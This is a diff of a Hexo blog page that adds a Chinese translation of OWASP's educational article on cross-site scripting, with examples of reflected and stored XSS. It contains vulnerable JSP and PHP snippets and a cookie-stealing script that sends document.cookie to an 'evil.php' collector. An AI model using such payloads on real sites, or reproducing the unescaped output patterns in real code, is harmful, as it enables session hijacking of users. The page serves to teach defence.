@@ -13,7 +13,7 @@
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="概述跨站脚本攻击（XSS）是一类注入，其恶意脚本被注入到可信的网站中。攻击者使用应用程序发送恶意代码，一般是在浏览器端脚本的表格中，给不同的终端用户的时候XSS攻击就发生了。缺陷使得这些攻击得逞非常普遍，并且发生在任何一处使用来自用户的输入和输出而有没有校验或编码它的web应用程序中。
 攻击者可以利用XSS发送恶意脚本给信任的人。终端用户的浏览器没有办法了解到脚本是否该被信任，并且将会执行脚本。因">
-<meta property="og:updated_time" content="2015-11-02T15:22:40.936Z">
+<meta property="og:updated_time" content="2015-11-03T14:15:45.571Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Cross-site Scripting">
 <meta name="twitter:description" content="概述跨站脚本攻击（XSS）是一类注入，其恶意脚本被注入到可信的网站中。攻击者使用应用程序发送恶意代码，一般是在浏览器端脚本的表格中，给不同的终端用户的时候XSS攻击就发生了。缺陷使得这些攻击得逞非常普遍，并且发生在任何一处使用来自用户的输入和输出而有没有校验或编码它的web应用程序中。
@@ -145,11 +145,66 @@ Employee ID: </span><span class="vbscript">&lt;%= eid %&gt;</span><span class="x
 </code></pre><p>如果eid仅包含标准的字母数字文本时，实例中的代码就操作正确的。如果eid有一个包含元字符或者源代码的值，然后代码就会被浏览器执行，正如他显示HTTP相应一样。</p>
 <p>最初这个可能不会出现太大的漏洞，毕竟，为什么会有人输入URL能导致恶意代码运行在他自己的电脑上？真正的危险在于攻击者会创建恶意的URL。然后使用电子邮件或社会工程学手段来引诱受害者访问URL链接。当受害者点击链接，他们不知不觉将恶意内容通过易受攻击的web应用程序反射到他们自己的电脑。这种利用易受攻击的web应用程序的这种机制被称作反射XSS。</p>
 <p><strong>实例2</strong></p>
+<p>下面Jsp代码片段用给的ID去查数据库雇员，并且输出相应的雇员名称。</p>
+<pre><code><span class="xml"></span><span class="vbscript">&lt;%... 
+ Statement stmt = conn.createStatement();
+ ResultSet rs = stmt.executeQuery(<span class="string">"select * from emp where id="</span>+eid);
+ <span class="keyword">if</span> (rs != <span class="literal">null</span>) {
+  rs.<span class="keyword">next</span>(); 
+  <span class="built_in">String</span> name = rs.getString(<span class="string">"name"</span>);
+%&gt;</span><span class="xml">
+
+Employee Name: </span><span class="vbscript">&lt;%= name %&gt;</span><span class="xml"></span>
+</code></pre><p>实例1中，当名称的值是合适的表现形式的时候，代码功能是正确的，否则，那么它将对阻止攻击毫无用处。再者，这个代码能表现的更小的危害，因为他是从数据库读取名称的值，他的内容显然是由应用程序管理的。然而，如果名称的值来自于用户提供的数据，那么数据库可能成了而已内容的渠道。数据库内对所有存储的数据没有合适的输入校验，攻击者能够在他的web浏览器执行恶意命令。这种类型的攻击，被称作存储XSS，他是特别隐蔽的，因为所引起的数据存储的间接性，使得更难识别威胁和增加了攻击影响到多个用户的可能性。XSS是从web网站提供的给访客的留言本上开始的，攻击者将在他们的留言上包含javascript，然后所有随后访客访问留言页面都将执行恶意的代码。<br>作为例子证明，XSS漏洞是有包含在HTTP响应的未经验证的数据代码引起的。这里有三个途径使XSS攻击能够到达受害者。</p>
+<ul>
+<li>实例1中，数据是直接从HTTP请求读取然后通过HTTP响应反射回来。反射XSS攻击发生在当攻击者造成一个用户提供危险内容给易受到攻击的web网站，然后反射回来给用户并被web浏览器执行。大多数常见的传送恶意内容的机制是把它作为参数包含在URL中，然后被发送或邮件直接给受害者。以这种方式构造URL成为了许多网络钓鱼骗局的核心，攻击者借此引诱受害者访问一个指向易受攻击的网站URL。当网站反射攻击者内容给用户后，内容将被执行并且继续传送隐私信息，如可能包含session信息的cookies，从用户机器传递给攻击者，或者执行其他恶意的行为。</li>
+<li>实例2中，应用在数据库中存储了恶意的数据或者其他信任的数据。危险的数据随后被读取到应用程序，包括在动态内容中。存储XSS攻击发生在攻击者注入危险内容到数据中存储，过后再读取并包含在动态内容中。从攻击者的角度出发，注入而已内容的最佳位置是显示给许多用户或特别吸引用户的地方。感兴趣的用户在应用中通常具有提升权限或和对攻击者有价值的敏感数据交互。如果其中一个用户执行了恶意的内容，攻击者可能代表用户执行权限操作或者获得接触属于用户的敏感数据的权限。</li>
+<li>应用程序存储危险数据在数据库或其他数据存储区，然后危险数据随后被作为新人的数据读取到应用程序中，被动态内容所包含。</li>
+</ul>
+<h3 id="攻击实例">攻击实例</h3><h4 id="实例1：cookie采集">实例1：cookie采集</h4><p>如果应用程序没有校验输入数据，攻击者可以很容易从一个已经认证的用户偷取cookie。所有的攻击者必须放置如下的代码在任何被发送的输入处（也就是：消息板，私信，用户个人资料）：</p>
+<pre><code><span class="tag">&lt;<span class="title">SCRIPT</span> <span class="attribute">type</span>=<span class="value">"text/javascript"</span>&gt;</span><span class="javascript">
+<span class="keyword">var</span> adr = <span class="string">'../evil.php?cakemonster='</span> + <span class="built_in">escape</span>(<span class="built_in">document</span>.cookie);
+</span><span class="tag">&lt;/<span class="title">SCRIPT</span>&gt;</span>
+</code></pre><p>上面的代码将传送cookie转义的内容（根据RFC内容在通过HTTP协议的GET方法发送内容前一定要转义）到evil.php脚本的<strong>cakemonster</strong>变量中。攻击者然后核对他的evil.php脚本的结果（cookie采集器一般会讲cookie写入到一个文件）并且使用它。</p>
+<p>错误页面实例<br>让我们假设我们有一个错误页面，它包含一个不存在的页面的请求，经典的404错误页面。我们可能像下面实例一样的代码告知用户页面丢失的详情：</p>
+<pre><code><span class="tag">&lt;<span class="title">html</span>&gt;</span>
+<span class="tag">&lt;<span class="title">body</span>&gt;</span>
+
+<span class="php"><span class="preprocessor">&lt;?</span> php
+<span class="keyword">print</span> <span class="string">"Not found: "</span> . urldecode(<span class="variable">$_SERVER</span>[<span class="string">"REQUEST_URI"</span>]);
+<span class="preprocessor">?&gt;</span></span>
+
+<span class="tag">&lt;/<span class="title">body</span>&gt;</span>
+<span class="tag">&lt;/<span class="title">html</span>&gt;</span>
+</code></pre><p>让我们看如何工作的：</p>
+<pre><code><span class="string">http:</span><span class="comment">//testsite.test/file_which_not_exist</span>
+</code></pre><p>我们获得的响应：</p>
+<pre><code><span class="literal">Not</span> found: /file_which_not_exist
+</code></pre><p>现在我们尝试强制错误页面包含我们的代码：</p>
+<pre><code>http://testsite.test/<span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="actionscript">alert(<span class="string">"TEST"</span>);</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>
+</code></pre><p>结果是：</p>
+<pre><code>Not found: / (<span class="keyword">but</span> <span class="keyword">with</span> JavaScript code &lt;<span class="keyword">script</span>&gt;alert(<span class="string">"TEST"</span>);&lt;/<span class="keyword">script</span>&gt;)
+</code></pre><p>我们已经成功注入了我们的XSS代码，什么意思？例如，我们能够使用这个缺陷去尝试盗取用户的session会话了。</p>
+<h2 id="相关攻击">相关攻击</h2><ul>
+<li><a href="https://www.owasp.org/index.php/XSS_Attacks" target="_blank" rel="external">XSS Attacks</a></li>
+</ul>
+<h2 id="相关漏洞">相关漏洞</h2><ul>
+<li><a href="https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting" target="_blank" rel="external">Types of Cross-Site Scripting</a></li>
+<li><a href="https://www.owasp.org/index.php/Cross_Site_Scripting_Flaw" target="_blank" rel="external">Cross Site Scripting Flaw</a></li>
+</ul>
+<h2 id="相关控件">相关控件</h2><ul>
+<li><a href="https://www.owasp.org/index.php/HTML_Entity_Encoding" target="_blank" rel="external">HTML Entity Encoding</a></li>
+<li><a href="https://www.owasp.org/index.php/Category:Input_Validation" target="_blank" rel="external">Category:Input Validation</a></li>
+</ul>
+<h2 id="参考">参考</h2><ul>
+<li><a href="https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting" target="_blank" rel="external">XSS (Cross Site Scripting) Prevention Cheat Sheet</a>_Prevention_Cheat_Sheet)</li>
+<li><a href="https://www.owasp.org/index.php/Data_Validation" target="_blank" rel="external">Data Validation</a></li>
+</ul>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2015/11/01/Cross-site-Scripting/" data-id="cigi3ir4u0007bsqwvfcifd93" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2015/11/01/Cross-site-Scripting/" data-id="cigjgksnb0007kwqwfq0ll6sj" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XSS/">XSS</a></li></ul>
